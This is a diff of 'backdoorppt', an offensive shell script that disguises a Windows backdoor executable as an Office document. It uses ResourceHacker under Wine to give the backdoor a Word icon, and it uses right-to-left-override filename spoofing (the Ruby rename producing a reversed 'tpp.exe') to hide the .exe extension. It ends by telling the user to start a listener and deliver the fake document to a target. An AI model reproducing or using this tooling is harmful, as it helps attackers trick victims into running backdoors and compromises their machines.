@@ -1,9 +1,9 @@
 #!/bin/sh
 ###
 # backdoorppt - A MS Office spoof extensions tool
-# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.6
+# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.7
 # Suspicious-Shell-Activity (SSA) RedTeam develop @2017
-# codename: strange things happen under windows
+# codename: ghost-in-a-shell
 #
 # [ TOOL DESCRIPTION ]
 # This tool Supports wine 32 or 64 bits installations
@@ -36,10 +36,11 @@ Reset="${Escape}[0m";
 #
 # variable declarations
 #
-VeR="1.6"
-ArCh=`arch`
-IPATH=`pwd`
-HoME=`echo ~`
+VeR="1.7" # script version
+ArCh=`arch` # store attackers arch
+IPATH=`pwd` # store script full path
+HoME=`echo ~` # store home full path
+CnA="ghost-in-a-shell" # script codename 
 HkLm=`cat $HoME/.wine/system.reg | egrep -m 1 'ProductName' | cut -d '=' -f2 | cut -d '"' -f2` > /dev/null 2>&1 # wine windows version
 #
 # Read options (configurations) from settings file ..
@@ -86,16 +87,14 @@ Colors;
 #
 # check for dependencies
 #
-echo ${BlueF}[☆]${white} Checking backend applications .. ${Reset};
+echo ${BlueF}[☆]${white}" Checking backend applications .. "${Reset};
 sleep 1
-if [ "$tRan" = "YES" ]; then
-echo "running default transformation method" > /dev/null 2>&1
-else
+if ! [ "$tRan" = "YES" ]; then
 apc=`which ruby`
 if [ "$?" != "0" ]; then
 echo ""
-echo ${RedF}[x]${white} Ruby interpreter '->' ${RedF}not found! ${Reset};
-echo ${RedF}[x]${white} This script requires ruby to work! ${Reset};
+echo ${RedF}[x]${white}" Ruby interpreter     : ${RedF}not found! "${Reset};
+echo ${RedF}[x]${white}" This funtion requires ruby to work! "${Reset};
 sleep 1
 exit
 else
@@ -105,14 +104,16 @@ fi
 fi
 
 # search for wine installation
-apc=`which wine`
+apc=`which $arch`
 if [ "$?" != "0" ]; then
 echo ""
-echo ${RedF}[x]${white} Wine installation '->' ${RedF}not found! ${Reset};
+echo ${RedF}[x]${white}" Wine installation    : ${RedF}not found! "${Reset};
 sleep 1
-echo ${RedF}[x]${white} This script requires wine to work! ${Reset};
-echo ${RedF}[x]${white} Please run: sudo apt-get install wine ${Reset};
-echo ${RedF}[x]${white} to install missing dependencies... ${Reset};
+echo ${RedF}[x]${white}" This script requires wine to work! "${Reset};
+echo ${RedF}[x]${white}" Please wait, installing missing dependencies .."${Reset};
+echo ""
+sudo apt-get install $arch
+echo ""
 exit
 else
 echo ${BlueF}[☆]${white}" Wine installation   : ${GreenF}found! "${Reset};
@@ -123,11 +124,13 @@ fi
 apc=`which zenity`
 if [ "$?" != "0" ]; then
 echo ""
-echo ${RedF}[x]${white} Zenity installation '->' ${RedF}not found! ${Reset};
+echo ${RedF}[x]${white}" Zenity installation  : ${RedF}not found! "${Reset};
 sleep 1
-echo ${RedF}[x]${white} This script requires Zenity to work! ${Reset};
-echo ${RedF}[x]${white} Please run: sudo apt-get install zenity ${Reset};
-echo ${RedF}[x]${white} to install missing dependencies... ${Reset};
+echo ${RedF}[x]${white}" This script requires Zenity to work! "${Reset};
+echo ${RedF}[x]${white}" Please wait, installing missing dependencies .."${Reset};
+echo ""
+sudo apt-get install zenity
+echo ""
 exit
 else
 echo ${BlueF}[☆]${white}" Zenity installation : ${GreenF}found! "${Reset};
@@ -138,11 +141,13 @@ fi
 apc=`which xterm`
 if [ "$?" != "0" ]; then
 echo ""
-echo ${RedF}[x]${white} Xterm installation '->' ${RedF}not found! ${Reset};
+echo ${RedF}[x]${white}" Xterm installation   : ${RedF}not found! "${Reset};
 sleep 1
-echo ${RedF}[x]${white} This script requires xterm to work! ${Reset};
-echo ${RedF}[x]${white} Please run: sudo apt-get install xterm ${Reset};
-echo ${RedF}[x]${white} to install missing dependencies... ${Reset};
+echo ${RedF}[x]${white}" This script requires xterm to work! "${Reset};
+echo ${RedF}[x]${white}" Please wait, installing missing dependencies .."${Reset};
+echo ""
+sudo apt-get install xterm
+echo ""
 exit
 else
 echo ${BlueF}[☆]${white}" Xterm installation  : ${GreenF}found! "${Reset};
@@ -158,14 +163,14 @@ if [ "$ByPa" = "NO" ]; then
     echo ${BlueF}[☆]${white}" Wine $PgFi  : ${GreenF}found! "${Reset};
     sleep 1
   else
-    echo ${RedF}[x]${white} Wine $PgFi '->' ${RedF}not found! ${Reset};
-    echo ${RedF}[x]${white} $HoME/.wine/drive_c/$PgFi ${Reset};
+    echo ${RedF}[x]${white}" Wine $PgFi   : ${RedF}not found! "${Reset};
+    echo ${RedF}[x]${white}" $HoME/.wine/drive_c/$PgFi "${Reset};
     sleep 1
-    echo ${RedF}[x]${white} Please wait, running winecfg! ${Reset};
+    echo ${RedF}[x]${white}" Please wait, running winecfg! "${Reset};
     winecfg > /dev/null 2>&1
     echo ""
     # List directorys just to be sure ..
-    echo ${RedF}Listing drive_c directorys: ${Reset};
+    echo ${RedF}"Listing drive_c directorys: "${Reset};
     ls $HoME/.wine/drive_c
     echo ""
     sleep 1
@@ -217,9 +222,9 @@ fi
     # Config WINE windows version (if not supported) ..
     #
     if ! [ "$HkLm" = "Microsoft Windows 7" ]; then
-      echo ${RedF}[x]${white} Wine system detected: $HkLm ${Reset};
-      echo ${RedF}[x]${white} FakeImageExploiter requires: windows 7 version ..${Reset};
-      echo ${YellowF}[☆] Starting winecfg, Please sellect required version ..${Reset};
+      echo ${RedF}[x]${white}" Wine system detected: $HkLm "${Reset};
+      echo ${RedF}[x]${white}" FakeImageExploiter requires: windows 7 version .."${Reset};
+      echo ${YellowF}[☆]" Starting winecfg, Please sellect required version .."${Reset};
       sleep 1
       winecfg > /dev/null 2>&1
     fi
@@ -231,7 +236,7 @@ fi
       echo ${BlueF}[☆]${white}" ResourceHacker.exe  : ${GreenF}found! "${Reset};
       sleep 1
     else
-      echo ${RedF}[x]${white} ResourceHacker.exe '->' ${RedF} not found! ${Reset};
+      echo ${RedF}[x]${white}" ResourceHacker.exe   : ${RedF} not found! "${Reset};
       sleep 1
 cat << !
 
@@ -242,8 +247,8 @@ cat << !
 !
       sleep 3
       xterm -T "BackdoorPPt" -geometry 90x26 -e "$arch $IPATH/bin/reshacker_setup.exe && sleep 3"
-      echo ${YellowF}[⊶]${white} Please wait, restarting tool! ${Reset};
-      echo ${YellowF}[⊶]${white} For proper ResourceHacker.exe Instalation! ${Reset};
+      echo ${YellowF}[⊶]${white}" Please wait, restarting tool! "${Reset};
+      echo ${YellowF}[⊶]${white}" For proper ResourceHacker.exe Instalation! "${Reset};
       sleep 2
       exit
     fi
@@ -251,7 +256,7 @@ cat << !
     #
     # wine command to call resourcehacker and add an MS-WORD.ico to the backdoor
     #
-    echo ${YellowF}[☆] Working on backdoor agent .. ${Reset};
+    echo ${YellowF}[☆]" Working on backdoor agent .."${Reset};
     sleep 1
     echo ${BlueF}[☆]${white}" Transforming backdoor agent    : ${GreenF}done .. "${Reset};
     $arch "$RhI" -open "$UpL" -save "$IPATH/output/backdoor.exe" -action addskip -res "$PaTh" -mask ICONGROUP,MAINICON,
@@ -262,9 +267,9 @@ cat << !
 
     # Copy binary to output folder to be manually transformed ..
     cp $UpL $IPATH/output/backdoor.exe > /dev/null 2>&1
-    echo ${YellowF}[☆]${white} Manually change icon.ico sellected ..${Reset};
-    echo ${YellowF}[☆]${white} Use your favorite editor to change icon [backdoor.exe]${Reset};
-    echo ${YellowF}[☠] When finish, press any key to Continue ..${Reset};
+    echo ${YellowF}[☆]${white}" Manually change icon.ico sellected .."${Reset};
+    echo ${YellowF}[☆]${white}" Use your favorite editor to change the icon of [backdoor.exe]"${Reset};
+    echo ${YellowF}[☠]" When finish, press any key to Continue .."${Reset};
     # Waiting for you to finish (read op) ..
     read op
 
@@ -285,10 +290,9 @@ cat << !
   sleep 1
   cd $IPATH/output
   # rename backdoor output name
-  echo ${BlueF}[☆]${white}" Word doc builder (backdoorppt) : ${GreenF}done .. "${Reset};
-  if [ "$tRan" = "YES" ]; then
-    echo "bash build" > /dev/null 2>&1
-  else
+  echo ${BlueF}[☆]${white}" Word doc builder (output-name) : ${GreenF}done .. "${Reset};
+
+  if ! [ "$tRan" = "YES" ]; then
     echo "$MiP" > outname.txt
     #
     # Ruby command to READ 'te.txt' that contains agent output name, then
@@ -297,14 +301,14 @@ cat << !
     ruby -e 'fil = File.read("outname.txt") and File.rename("backdoor_ppt.exe", "#{fil}\xe2\x80\xaetpp.exe")'
     rm outname.txt > /dev/null 2>&1
   fi
-  cd $IPATH
   sleep 1
+  cd $IPATH
 
 
 #
 # Display final outputs to user
 #
-echo ${YellowF}[☆] Task over, Writing reports .. ${Reset};
+echo ${YellowF}[☆]" Task over, Writing reports .."${Reset};
 sleep 2
 if [ "$IcOn" = "Input your own icon" ]; then
 IcOn="$PaTh"
@@ -314,32 +318,48 @@ fi
     echo ""
     echo ${RedF}"    Icon select : $IcOn"${Reset};
     echo ${RedF}"    Final file  : $IPATH/output/$MiP.ppt.exe"${Reset};
-    echo ${RedF}"    Tool Author : r00t-3xp10it (SSA RedTeam)"${Reset};
-  else
-    echo ""
-    dre="exe.ppt"
-    echo ${RedF}"    Icon select : $IcOn"${Reset};
-    echo ${RedF}"    Final file  : $IPATH/output/$MiP$dre"${Reset};
-    echo ${RedF}"    Tool Author : r00t-3xp10it (SSA RedTeam)"${Reset};
-  fi
-
 cat << !
 
     Your backdoor agent its now transformed into one fake
     word doc (ppt) remmenber that .exe extensions will not
     be 'visible' under windows systems, because the system
-    default behavior its: NOT show hidden extensions...
+    default behavior its: NOT show hidden extensions ..
 
     We are now ready to start a handler (listener) and
     deliver the transformed agent to the target machine.
 
 !
+  else
+    echo ""
+    dre="exe.ppt"
+    echo ${RedF}"    Icon select : $IcOn"${Reset};
+    echo ${RedF}"    Final file  : $IPATH/output/$MiP$dre"${Reset};
+cat << !
+
+    Your backdoor agent its now transformed into one fake
+    word doc (ppt) using RTLO spoofing extensions method.
+
+    We are now ready to start a handler (listener) and
+    deliver the transformed agent to the target machine.
+
+!
+  fi
+
+
 #
 # The user dont want to run the tool (aborted switch) ..
 #
 else
-  echo ${RedF}[x]${white} Aborting all tasks ..${Reset};
+  echo ${RedF}[x]${white}" Aborting all tasks  : ${GreenF}done!"${Reset};
   sleep 2
+    echo ""
+    echo ${white}Codename${RedF}::${white}$CnA ${Reset};
+    echo ${white}Author${RedF}::${white}pedr0 ubuntu${RedF}::${white}[r00t-3xp10it]${Reset};
+    echo ${white}backdoorppt${RedF}::${white}v$VeR${RedF}::${white}SuspiciousShellActivity©${RedF}::${white}RedTeam${RedF}::${white}2017${Reset};
+exit
 fi
 # exit tool, and good nigth ..
+    echo ${white}Codename${RedF}::${white}$CnA ${Reset};
+    echo ${white}Author${RedF}::${white}pedr0 ubuntu${RedF}::${white}[r00t-3xp10it]${Reset};
+    echo ${white}backdoorppt${RedF}::${white}v$VeR${RedF}::${white}SuspiciousShellActivity©${RedF}::${white}RedTeam${RedF}::${white}2017${Reset};
 exit
